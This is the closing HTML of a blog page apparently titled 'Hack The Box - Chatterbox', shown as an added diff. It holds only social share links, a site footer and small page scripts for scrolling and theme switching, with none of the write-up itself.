+<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Chatterbox on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2frzul.me%2fposts%2fhtb-chatterbox%2f&title=Hack%20The%20Box%20-%20Chatterbox&summary=Hack%20The%20Box%20-%20Chatterbox&source=https%3a%2f%2frzul.me%2fposts%2fhtb-chatterbox%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Chatterbox on reddit" href="https://reddit.com/submit?url=https%3a%2f%2frzul.me%2fposts%2fhtb-chatterbox%2f&title=Hack%20The%20Box%20-%20Chatterbox"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Chatterbox on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frzul.me%2fposts%2fhtb-chatterbox%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Chatterbox on whatsapp" href="https://api.whatsapp.com/send?text=Hack%20The%20Box%20-%20Chatterbox%20-%20https%3a%2f%2frzul.me%2fposts%2fhtb-chatterbox%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Chatterbox on telegram" href="https://telegram.me/share/url?text=Hack%20The%20Box%20-%20Chatterbox&url=https%3a%2f%2frzul.me%2fposts%2fhtb-chatterbox%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
+</div>
+</footer>
+</article>
+</main>
+<footer class=footer>
+<span>&copy; 2022 <a href=https://rzul.me/>Román Zuleta</a></span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+</body>
+</html>
